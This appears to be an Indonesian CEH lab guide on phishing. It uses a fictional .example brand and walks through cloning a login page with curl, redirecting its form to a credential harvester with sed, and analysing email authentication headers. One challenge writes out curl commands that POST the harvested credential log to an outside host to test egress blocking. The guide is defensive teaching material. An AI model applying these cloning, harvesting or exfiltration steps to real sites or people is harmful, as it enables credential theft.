# Lab 04 - Social engineering, halaman umpan dan analisis header surel

Modul CEH 09 - Social Engineering | 50 menit | Level 2

## Peringatan dan batas, baca sampai habis sebelum menyalakan apa pun

Lab ini membuat halaman umpan yang benar-benar menangkap apa yang diketik ke
dalamnya. Itu sebabnya bagian ini ada di paling atas, bukan di bawah.

1. **Merek di lab ini fiktif, dan itu bukan formalitas.** Tirtabyte tidak ada.
   Semua domain memakai TLD `.example` yang dicadangkan RFC 2606 dan tidak
   pernah bisa didaftarkan siapa pun, termasuk oleh Anda. Jangan mengganti
   nama, logo, atau domain di lab ini dengan milik perusahaan, bank, kampus,
   instansi, atau layanan yang benar-benar ada. Halaman umpan yang meniru
   lembaga nyata adalah bahan tipu siap pakai, dan membuatnya sudah cukup
   untuk jadi masalah walaupun tidak pernah dikirim ke siapa-siapa.
2. **Jangan pernah mengetik kata sandi sungguhan** di halaman mana pun di
   dalam lab ini. Pakai kredensial latihan yang sudah disediakan:
   `rina.wulandari` dengan kata sandi `KataSandiPalsu123`. Keduanya palsu dan
   memang dibuat untuk dibuang.
3. **Nol egress, dan itu ditegakkan di lapisan jaringan.** Jaringan lab
   internal, jadi halaman umpan tidak punya jalan keluar ke internet maupun ke
   jaringan kelas. Hasil tangkapan ditulis ke berkas di dalam volume lab,
   tidak dikirim ke mana pun, dan ikut terhapus waktu lab dimatikan.
4. **Tidak ada manusia yang jadi sasaran di lab ini.** Anda mengisi formulir
   Anda sendiri, di laptop Anda sendiri. Menguji halaman semacam ini ke orang
   lain, termasuk ke teman sekelas, memerlukan izin tertulis dan cakupan yang
   disepakati. Tanpa itu, yang Anda lakukan bukan latihan.
5. **Jangan membawa keluar berkas dari lab ini** untuk dipakai di luar konteks
   kelas. Berkas surel di `files/surat/` adalah bahan analisis, bukan cetakan
   untuk dikirim.

Kalau ada satu poin di atas yang belum jelas, tanyakan sebelum menyalakan lab.

## Yang dibuktikan di lab ini

Anda membuktikan sendiri bahwa halaman masuk palsu bisa dibuat mirip sempurna
dalam hitungan detik dengan satu perintah, sehingga indikator visual seperti
tampilan dan ejaan runtuh sebagai pertahanan. Lalu Anda membuktikan indikator
mana yang tidak ikut runtuh, dan kontrol mana yang benar-benar memutus rantai
serangan.

Ini modul CEH 09, Social Engineering, khususnya bagian computer-based social
engineering: phishing, spear phishing, credential harvesting, site cloning,
dan pengenalan indikator phishing lewat header surel.

## Waktu yang dibutuhkan

50 menit. Langkah 1 sampai 8 sekitar 35 menit, sisanya untuk pertanyaan dan
diskusi. Tantangan tambahan di luar itu.

## Menyalakan

```
./lab up 04          # macOS, Linux
.\lab.cmd up 04      # Windows
```

Dua alamat, dan bedanya penting sepanjang lab ini:

| Alamat | Apa itu |
|---|---|
| http://localhost:8400 | Portal Tirtabyte Connect yang SAH |
| http://localhost:8401 | Halaman umpan, ini yang Anda kerjakan |

Terminal penyerang: `./lab sh 04`

## Peta lab

| Container | Perannya | Alamat dari dalam toolbox |
|---|---|---|
| toolbox | tempat Anda mengetik | - |
| portal | portal karyawan yang sah | `portal`, alias `portal.tirtabyte.example` |
| phish | server halaman umpan | `phish`, alias `portal-tirtabyte.masuk-aman.example` |

Dari dalam toolbox, panggil target memakai NAMANYA, bukan localhost.
`curl http://portal/` jalan, `curl http://localhost:8400/` tidak jalan.
Alasannya: setiap container punya localhost sendiri.

Dua jalur ke berkas kerja, keduanya dari dalam toolbox:

| Jalur | Isinya |
|---|---|
| `/phish/index.html` | halaman yang dilayani di port 8401. Ini yang Anda ubah |
| `/tangkapan/kredensial.log` | hasil panen sisi penyerang |
| `/lab/files/surat/` | tiga berkas surel untuk dianalisis |

## Langkah

### 1. Lihat dulu portal yang sah

Buka http://localhost:8400 di browser.

Yang harus terlihat: kartu putih dengan judul `Tirtabyte Connect`, subjudul
`Portal karyawan PT Tirtabyte Nusantara`, dua kolom isian, dan tombol `Masuk`.
Di bagian bawah ada catatan bahwa tim IT tidak pernah meminta kata sandi lewat
surel.

Amati baik-baik. Halaman ini yang jadi pembanding sepanjang sisa lab.

### 2. Lihat halaman umpan versi kasar, lalu daftar indikatornya

Buka http://localhost:8401.

Yang harus terlihat: latar kuning, kotak bergaris merah putus-putus, judul
`Tirtabite Conect`, dan spanduk merah `PERINGATAN PENTING!!!`.

**Tulis di catatan Anda minimal enam indikator** yang membuat halaman ini
mencurigakan. Kerjakan ini sebelum lanjut, karena daftar inilah yang akan
Anda bandingkan lagi di Langkah 7.

Sekarang isi formulirnya dengan kredensial latihan, `rina.wulandari` dan
`KataSandiPalsu123`, nomor telepon boleh diisi apa saja, lalu tekan
`VERIFIKASI SEKARANG`.

Yang harus terlihat: halaman `Sesi Anda berakhir` dengan tautan kembali ke
portal. Itu pola yang dipakai kit phishing sungguhan, dan alasannya ada di
Langkah 5.

Buka panel penyerang: http://localhost:8401/cgi-bin/panen.cgi

Yang harus terlihat: `Jumlah tangkapan: 1` dan satu baris berisi nama
pengguna, kata sandi, dan nomor telepon yang tadi Anda ketik.

<details><summary>Kalau ingin buktinya di terminal, bukan di browser</summary>

Dari terminal laptop Anda, bukan dari dalam toolbox:

```
curl -s -X POST -e 'http://localhost:8401/' \
  -d 'pengguna=rina.wulandari&sandi=KataSandiPalsu123' \
  http://localhost:8401/cgi-bin/masuk.cgi | grep '<h1'
curl -s http://localhost:8401/cgi-bin/panen.cgi | grep -o 'Jumlah tangkapan: [0-9]*'
```
</details>

### 3. Analisis header tiga surel

Masuk ke terminal penyerang:

```
./lab sh 04
```

Urai surat pertama:

```
python3 /lab/files/periksa-header.py /lab/files/surat/01-verifikasi-akun.eml
```

Yang harus terlihat, apa adanya dari mesin uji:

```
KESELARASAN DOMAIN
  From              tirtabyte.example
  Return-Path       mx3.kirimcepat.example
  Reply-To          surelcepat.example
  Message-ID        vps-2231.penyewaanmurah.example

HASIL AUTENTIKASI APA ADANYA
  Authentication-Results: ... spf=fail ... dkim=none ... dmarc=fail (p=none dis=none)

TAUTAN: YANG TERLIHAT LAWAN YANG DITUJU
  terlihat : https://portal.tirtabyte.example/verifikasi
  menuju   : http://portal-tirtabyte.masuk-aman.example/
```

Perkakas ini sengaja tidak memberi vonis. Dia cuma mengurai, persis seperti
Message Header Analyzer dan MXToolbox Header Analyzer yang dipakai di
lapangan. Penilaiannya tetap tugas Anda, dan itu yang ditanya di soal.

Sekarang jalankan yang sama untuk dua surat lainnya, dan bandingkan:

```
python3 /lab/files/periksa-header.py /lab/files/surat/02-pemeliharaan-terjadwal.eml
python3 /lab/files/periksa-header.py /lab/files/surat/03-perubahan-rekening.eml
```

Surat 02 lolos SPF, DKIM, dan DMARC dengan domain yang selaras. Surat 03 juga
lolos ketiganya, tapi bukan berarti aman. Cari sendiri bedanya sebelum
membaca pertanyaan di bawah.

Sekali lagi tanpa perkakas, langsung ke header mentahnya, karena di ujian yang
disodorkan adalah teks mentah:

```
grep -c '^Received:' /lab/files/surat/01-verifikasi-akun.eml
grep -iE '^(Return-Path|From|Reply-To|Message-ID|X-Mailer):' /lab/files/surat/01-verifikasi-akun.eml
```

Yang harus terlihat: angka `3` untuk perintah pertama, dan lima baris header
untuk perintah kedua.

Tautan di surat 01 bukan hiasan. Nama itu benar-benar hidup di dalam jaringan
lab, masih dari dalam toolbox:

```
curl -s http://portal-tirtabyte.masuk-aman.example/ | grep -m1 title
```

Yang harus terlihat: `<title>Login Tirtabite Conect</title>`. Domain yang
tertulis di surat memang mengarah ke halaman umpan, bukan ke portal.

### 4. Kloning portal yang sah, satu perintah

Masih di dalam toolbox:

```
curl -s http://portal/ -o /phish/index.html
```

Muat ulang http://localhost:8401 di browser.

Yang harus terlihat: halaman umpan sekarang **identik** dengan portal di port
8400. Latar kuning hilang, ejaan benar, tata letak sama persis.

Seluruh daftar indikator visual yang Anda tulis di Langkah 2 baru saja habis
oleh satu perintah `curl`. Di dunia nyata langkah ini dikerjakan oleh fitur
site cloner di Social-Engineer Toolkit, dan hasilnya sama.

### 5. Kirim kredensial, lalu perhatikan ke mana perginya

Di browser, di http://localhost:8401, isi lagi dengan `rina.wulandari` dan
`KataSandiPalsu123`, lalu tekan `Masuk`.

Yang harus terlihat, dan ini bukan kegagalan lab: halaman
`Nama pengguna atau kata sandi salah`, dan di bagian bawahnya tertulis
`Halaman ini dilayani oleh portal Tirtabyte yang sah, port 8400`.

Periksa panel penyerang lagi: http://localhost:8401/cgi-bin/panen.cgi

Yang harus terlihat: jumlah tangkapan **tetap 1**. Kredensialnya tidak
tertangkap.

Kenapa. Lihat sendiri dari dalam toolbox:

```
grep -n 'action=' /phish/index.html
```

Yang harus terlihat:

```
90:    <form method="post" action="http://localhost:8400/cgi-bin/masuk.cgi">
```

Salinan halaman membawa serta alamat tujuan formulir milik portal asli, dan
alamat itu absolut. Halamannya palsu, tapi datanya pulang ke pemiliknya. Ini
juga alasan kenapa `action` adalah hal pertama yang dilihat analis waktu
memeriksa halaman phishing yang dilaporkan pengguna.

### 6. Arahkan formulir ke pemanen, lalu panen

```
sed -i 's|http://localhost:8400/cgi-bin/masuk.cgi|/cgi-bin/masuk.cgi|' /phish/index.html
grep -n 'action=' /phish/index.html
```

Yang harus terlihat:

```
90:    <form method="post" action="/cgi-bin/masuk.cgi">
```

Muat ulang http://localhost:8401, isi lagi dengan kredensial latihan yang
sama, kirim.

Yang harus terlihat sekarang: halaman `Sesi Anda berakhir`, sama seperti di
Langkah 2. Korban akan mengira sesinya habis, menekan tautan kembali, masuk
dengan normal di portal asli, dan tidak pernah curiga.

Baca hasil panennya dari dalam toolbox:

```
cat /tangkapan/kredensial.log
```

Yang harus terlihat, satu baris per tangkapan:

```
2026-08-06T10:46:51 | ip=192.168.164.1 | ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... | referer=http://localhost:8401/ | pengguna=rina.wulandari; sandi=KataSandiPalsu123
```

Nilai `ip=` dan `ua=` di laptop Anda akan berbeda dari contoh di atas. Yang
harus sama adalah bentuk barisnya dan kehadiran nama pengguna serta kata sandi
di ujungnya.

Dua hal yang layak diperhatikan di baris itu. Pertama, yang tercatat bukan
cuma nama pengguna dan kata sandi. Kedua, jamnya memakai UTC karena container
tidak diberi zona waktu, persis seperti hop terakhir di surat 01 yang memakai
`+0000` sementara hop di atasnya memakai `+0700`. Selisih tujuh jam pada satu
pesan yang sama adalah hal biasa, dan bukan indikator.

### 7. Bandingkan daftar indikator, sebelum lawan sesudah

Masih di dalam toolbox:

```
curl -s http://portal/ -o /tmp/asli.html
diff /tmp/asli.html /phish/index.html
```

Yang harus terlihat: tepat satu blok perbedaan, yaitu baris `action` tadi.

```
90c90
<     <form method="post" action="http://localhost:8400/cgi-bin/masuk.cgi">
---
>     <form method="post" action="/cgi-bin/masuk.cgi">
```

Sekarang buka lagi daftar enam indikator dari Langkah 2, dan bagi dua:

| Indikator | Masih berlaku setelah kloning |
|---|---|
| Ejaan dan tata bahasa berantakan | tidak, hilang |
| Tampilan dan warna tidak seperti aslinya | tidak, hilang |
| Logo salah atau kabur | tidak, hilang |
| Formulir meminta data berlebihan | tidak, hilang |
| Nada mendesak dan ancaman tenggat | tidak, itu ada di surelnya, bukan di halamannya |
| Alamat di address bar bukan milik organisasi | **ya, tetap** |
| Formulir mengirim data ke tempat lain | **ya, tetap**, tapi cuma terlihat di kode sumber |
| Tidak ada HTTPS, atau sertifikatnya bukan milik organisasi | **ya, tetap** |
| Pengelola kata sandi diam, tidak mengisi otomatis | **ya, tetap** |
| Portal tidak meminta faktor kedua padahal biasanya meminta | **ya, tetap** |

Kesimpulan yang perlu Anda bisa ucapkan sendiri: indikator yang murah bagi
penyerang untuk dihapus adalah indikator yang tidak layak diandalkan sebagai
pertahanan.

### 8. Sisi bertahan: apa yang tercatat, dan kontrol apa yang memutus rantai

Dari terminal laptop Anda, bukan dari dalam toolbox:

```
docker logs ceh-04-phish 2>&1 | grep 'POST /cgi-bin/masuk.cgi'
```

Yang harus terlihat, satu baris untuk tiap kredensial yang terkirim:

```
192.168.164.1 - - [06/Aug/2026:10:46:51 +0000] "POST /cgi-bin/masuk.cgi HTTP/1.1" 200 1109
```

Alamat di kolom pertama akan berbeda di laptop Anda, dan itu wajar.

Bandingkan dengan sisi portal yang sah:

```
docker logs ceh-04-portal 2>&1 | grep PORTAL-SAH
```

Yang harus terlihat:

```
PORTAL-SAH: percobaan masuk gagal untuk pengguna 'rina.wulandari'
```

Nama penggunanya tercatat, kata sandinya tidak. Itu disengaja, dan itu praktik
yang benar: log aplikasi tidak boleh pernah memuat kata sandi, termasuk kata
sandi yang salah.

Sekarang petakan kontrolnya. Isi kolom ketiga sendiri di catatan Anda.

| Titik di rantai serangan | Kontrol yang memutusnya | Berhenti di lab ini atau tidak |
|---|---|---|
| Surel palsu masuk ke kotak masuk | DMARC dengan kebijakan `p=quarantine` atau `p=reject`, bukan `p=none` | |
| Pengguna membaca dan percaya | Spanduk pengirim eksternal, pelatihan, tombol lapor phishing | |
| Pengguna menekan tautan | Penyaringan URL, rewrite tautan di gateway surel, blokir domain baru | |
| Pengguna mengetik kata sandi | Pengelola kata sandi yang terikat origin, jadi tidak mengisi di domain salah | |
| Penyerang memakai kata sandi curian | MFA, dan yang paling kuat FIDO2 atau passkey karena terikat origin | |
| Penyerang sudah masuk | Deteksi login anomali, pembatasan sesi, segmentasi | |

Perhatikan baris pertama. Surat 01 gagal SPF, gagal DKIM, dan gagal DMARC,
tapi tetap sampai ke kotak masuk karena kebijakan domainnya `p=none`. Satu
perubahan kebijakan dari `p=none` menjadi `p=reject` menghentikan seluruh
rantai di langkah pertama, sebelum manusia mana pun sempat ikut terlibat.

## Pertanyaan

Jawabannya cuma ketemu kalau Anda benar-benar mengerjakan langkah di atas.

1. Berapa hop `Received` di surat 01, dan alamat IP mana yang pertama kali
   menyuntikkan pesan itu ke rantai surel?
2. Sebutkan empat domain di surat 01 pada header `From`, `Return-Path`,
   `Reply-To`, dan `Message-ID`. Berapa dari empat itu yang cocok satu sama
   lain?
3. Di surat 01, apa teks tautan yang dilihat korban, dan ke mana tautan itu
   sebenarnya menuju?
4. Surat 01 gagal DMARC tapi tetap terkirim. Baris mana persisnya yang
   menjelaskan kenapa, dan apa yang akan terjadi kalau nilai itu diubah jadi
   `p=reject`?
5. Surat 03 lolos SPF, DKIM, dan DMARC sekaligus. Kenapa tetap berbahaya, dan
   apa perbedaan persis antara domain di surat 03 dan domain organisasi
   sungguhan di surat 02?
6. Di `/tangkapan/kredensial.log`, apa saja yang tercatat selain nama pengguna
   dan kata sandi? Sebutkan empat.
7. Kenapa nilai `ip=` di catatan itu bukan `127.0.0.1`, padahal Anda membuka
   halamannya lewat `localhost`? Apa padanan masalah ini di aplikasi web nyata
   yang berada di belakang reverse proxy?
8. Berapa baris yang berbeda antara portal asli dan halaman umpan hasil
   kloning setelah Langkah 6, menurut keluaran `diff`?
9. Waktu Anda mengirim formulir di Langkah 5, port berapa yang menjawab? Apa
   yang dibuktikan hal itu tentang seberapa jauh tampilan halaman bisa
   dipercaya?
10. Dari tabel di Langkah 7, sebutkan tiga indikator yang tetap berlaku setelah
    kloning, dan jelaskan kenapa ketiganya mahal bagi penyerang untuk
    dihilangkan.

## Tantangan tambahan

Untuk yang sudah selesai lebih cepat. Semua tetap di dalam pagar yang sama:
merek fiktif, domain `.example`, dan tidak ada manusia yang jadi sasaran.

1. **Buktikan bahwa OTP lewat SMS bukan penghalang.** Tambahkan satu kolom
   isian bernama `kode_otp` ke formulir di `/phish/index.html`, kirim
   formulirnya, lalu buka `/tangkapan/kredensial.log`. Pemanen tidak pernah
   diberi tahu ada field baru. Jelaskan kenapa field itu tetap tertangkap, dan
   apa artinya untuk MFA berbasis kode sekali pakai dibandingkan FIDO2 yang
   terikat origin.
2. **Tulis satu baris deteksi.** Buat satu perintah `grep` atau `awk` atas
   keluaran `docker logs ceh-04-phish` yang menampilkan hanya permintaan POST
   ke titik pemanen beserta jamnya. Lalu tulis satu kalimat: field apa saja
   dari baris log itu yang akan Anda kirim ke SIEM, dan aturan apa yang akan
   Anda pasang di atasnya.
3. **Karang surat keempat yang lolos autentikasi.** Buat berkas
   `/tmp/04-buatan-saya.eml` di dalam toolbox, memakai domain mirip berakhiran
   `.example`, dengan `Authentication-Results` yang lolos SPF, DKIM, dan DMARC,
   persis pola surat 03. Jalankan `periksa-header.py` atasnya. Lalu jawab:
   kalau semua autentikasi lolos, kontrol apa yang tersisa untuk menangkapnya?
4. **Uji sendiri pagar egress-nya.** Dari dalam toolbox, coba kirim hasil
   panen ke luar:

   ```
   curl -m 5 -X POST -d @/tangkapan/kredensial.log http://example.com/
   curl -m 5 -X POST -d @/tangkapan/kredensial.log http://93.184.216.34/
   ```

   Yang harus terlihat, dua kegagalan yang berbeda sebabnya:

   ```
   curl: (6) Could not resolve host: example.com
   curl: (7) Failed to connect to 93.184.216.34 port 80 after 0 ms: Could not connect to server
   ```

   Yang pertama mati di DNS, yang kedua mati di tabel rute walaupun namanya
   sudah dilewati. Jelaskan lapisan mana yang menghentikan masing-masing, dan
   kenapa peringatan berbentuk paragraf di README tidak akan pernah sekuat
   itu.

## Yang tidak bisa dikerjakan di lab ini, dan kenapa

Ini bagian yang paling sering dilewat, padahal di ujian dan di lapangan justru
di sinilah bedanya orang yang paham dan orang yang cuma pernah menjalankan
perintah.

1. **Tidak ada surel yang benar-benar terkirim.** Tidak ada SMTP, tidak ada
   kotak masuk, tidak ada penerima. Tiga berkas `.eml` itu artefak untuk
   dianalisis, bukan pesan yang pernah dikirim. Di dunia nyata, sebelum sampai
   ke manusia, pesan itu melewati secure email gateway yang memberi skor,
   menulis ulang URL-nya, memindai lampiran, dan bisa mengarantina. Seluruh
   lapisan itu tidak ada di sini.
2. **Tidak ada HTTPS dan tidak ada sertifikat.** Phishing hari ini hampir
   selalu memakai HTTPS dengan sertifikat DV yang gratis dan terbit dalam
   hitungan menit, jadi nasihat lama "cari gembok di address bar" sudah tidak
   berguna. Lab ini bahkan tidak bisa menampilkan gemboknya, karena
   menerbitkan sertifikat butuh domain dan otoritas sertifikat, dan keduanya
   butuh internet yang sengaja ditutup di sini.
3. **Domain mirip tidak muncul di address bar browser Anda**, yang muncul cuma
   beda nomor port. Menampilkannya butuh mengubah berkas hosts atau DNS di
   laptop Anda, dan lab ini tidak boleh menyentuh konfigurasi sistem laptop
   peserta. Di dalam jaringan lab, domain miripnya benar-benar ada, dan itu
   sudah Anda buktikan sendiri di Langkah 3 dengan `curl` dari toolbox.
4. **Pencurian sesi lewat reverse proxy tidak dibangun di sini.** Serangan
   adversary-in-the-middle kelas Evilginx meneruskan permintaan korban ke
   situs asli secara langsung, sehingga kode OTP ikut valid dan yang dicuri
   adalah cookie sesi setelah MFA lewat. Itu yang membuat MFA berbasis kode
   bisa ditembus sementara FIDO2 tidak. Namanya perlu Anda hafal untuk ujian,
   tapi membangunnya butuh target sungguhan dengan sesi sungguhan.
5. **Kontrol pengelola kata sandi dan kunci FIDO2 tidak bisa didemokan jujur
   di sini.** Keduanya bekerja dengan mengikat kredensial ke origin, dan lab
   ini tidak punya origin sungguhan. Yang bisa Anda lakukan cuma memahami
   mekanismenya, bukan melihatnya menolak.
6. **Vishing, smishing, pretexting lewat telepon, tailgating, shoulder
   surfing, dumpster diving, dan USB drop tidak ada di lab ini.** Semuanya
   menyasar manusia dan ruang fisik. CEH menguji istilahnya, tapi melatihnya
   memerlukan cakupan tertulis dan persetujuan, bukan container.
7. **Tidak ada angka click rate.** Program awareness sungguhan mengukur berapa
   persen karyawan menekan tautan dan berapa yang melapor. Itu memerlukan
   penerima sungguhan, persetujuan manajemen, dan aturan penanganan data
   karyawan.

## Nyambung ke exam

Istilah yang keluar di soal, pakai penulisan persis ini. **Phishing** untuk
sebaran luas, **spear phishing** untuk sasaran tertentu, **whaling** untuk
eksekutif, **vishing** lewat suara, **smishing** lewat SMS. **Pharming**
mengalihkan korban lewat DNS atau berkas hosts, bukan lewat tautan. **Business
Email Compromise** adalah surat 03: autentikasi lolos, yang dipalsukan adalah
identitas dan konteksnya, dan mitigasinya verifikasi out-of-band, bukan filter.

Yang Anda kerjakan di Langkah 4 sampai 6 disebut **credential harvesting**
dengan **site cloning**, dan di soal biasanya diasosiasikan dengan
**Social-Engineer Toolkit (SET)** beserta modul Credential Harvester Attack
Method dan Site Cloner.

Untuk autentikasi surel, ingat pembagian tugasnya. **SPF** memeriksa apakah IP
pengirim boleh mengirim untuk domain di envelope, yaitu `Return-Path`, bukan
domain di `From`. **DKIM** memeriksa tanda tangan kriptografis atas isi pesan.
**DMARC** memeriksa keselarasan antara domain `From` dengan domain yang lolos
SPF atau DKIM, dan kebijakannya bernilai `none`, `quarantine`, atau `reject`.
Poin yang paling sering menjebak: DMARC lolos tidak berarti pesannya jujur,
karena penyerang bisa memiliki domain miripnya sendiri dan menandatanganinya
dengan benar. Itu persis surat 03.

Terakhir, urutan yang sering ditanya: social engineering punya empat fase,
yaitu **research**, **hook**, **play**, dan **exit**. Yang membuat serangan
berhasil adalah **pemicu psikologis**, terutama **urgency**, **authority**,
**fear**, **scarcity**, dan **social proof**. Surat 01 memakai tiga yang
pertama sekaligus, dan Anda sudah melihatnya sendiri.

## Ceklis, diisi sendiri

- [ ] Saya menulis minimal enam indikator dari halaman umpan versi kasar
- [ ] Saya bisa menyebut empat domain di surat 01 dan mana yang tidak selaras
- [ ] Saya paham kenapa surat 03 lolos DMARC dan tetap berbahaya
- [ ] Kloning saya berhasil, dan panel panen menunjukkan tangkapan bertambah
- [ ] Saya bisa menjelaskan kenapa kloning saja tidak cukup untuk memanen
- [ ] Saya bisa menyebut tiga indikator yang selamat dari kloning
- [ ] Saya bisa menyebut satu kontrol untuk tiap baris tabel di Langkah 8
- [ ] Saya paham batas etikanya, bukan cuma pernah membacanya

## Membereskan

```
./lab down 04          # macOS, Linux
.\lab.cmd down 04      # Windows
```

Perintah itu ikut membuang volume lab, jadi halaman umpan yang Anda buat dan
seluruh isi `/tangkapan/kredensial.log` terhapus. Itu memang yang diinginkan:
tidak ada sisa kredensial dan tidak ada sisa halaman umpan di laptop Anda
setelah kelas.

Kalau Anda ingin mengulang lab ini dari nol tanpa mematikannya:

```
./lab reset 04
```

## Pagar

Target lab ini cuma container `portal` dan `phish` di dalam compose lab ini.

Pagarnya bukan imbauan. Jaringan lab internal, jadi dari dalam toolbox memang
tidak ada jalan keluar sama sekali: bukan ke internet, bukan ke jaringan
kelas, bukan ke laptop peserta lain. Port 8400 dan 8401 juga diikat ke
127.0.0.1, jadi halaman umpan Anda tidak bisa dibuka oleh siapa pun di
ruangan yang sama. Dua-duanya sudah diuji, dan Tantangan 4 mengajak Anda
mengujinya sendiri.

Untuk lab ini pagar itu punya alasan tambahan yang lebih penting daripada
kerapian: halaman umpan yang bisa dijangkau orang lain bukan lagi latihan.
